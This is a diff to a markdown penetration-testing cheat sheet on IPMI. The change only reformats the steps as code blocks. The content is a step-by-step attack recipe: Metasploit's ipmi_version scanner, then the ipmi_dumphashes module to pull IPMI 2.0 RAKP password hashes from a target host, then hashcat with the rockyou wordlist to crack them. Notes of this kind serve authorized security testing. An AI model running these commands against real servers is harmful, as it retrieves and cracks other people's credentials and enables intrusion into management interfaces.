@@ -4,24 +4,42 @@
 
 ### Identify version using Metasploit
 
-#### 1) msfconsole
+#### 1) 
 
-#### 2)  use auxiliary/scanner/ipmi/impi_version
+    msfconsole
 
-#### 3) set RHOSTS HOST
+#### 2)  
 
-#### 4) run
+    use auxiliary/scanner/ipmi/impi_version
+
+#### 3) 
+
+    set RHOSTS HOST
+
+#### 4) 
+
+    run
 
 ### Then depending on the IPMI version, we can abuse the vulnerabilities below:
 
 ### Dump password hashes for users with Metasploit (IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval)
 
-#### 1) msfconsole
+#### 1) 
 
-#### 2) use auxiliary/scanner/ipmi/ipmi_dumphashes
+    msfconsole
 
-#### 3) set RHOSTS HOST
+#### 2) 
 
-#### 4) run
+    use auxiliary/scanner/ipmi/ipmi_dumphashes
 
-#### 5) hashcat -m 7300 -a 0 hash /usr/share/wordlists/rockyou.txt
+#### 3) 
+
+    set RHOSTS HOST
+
+#### 4) 
+
+    run
+
+#### 5) 
+
+    hashcat -m 7300 -a 0 hash /usr/share/wordlists/rockyou.txt
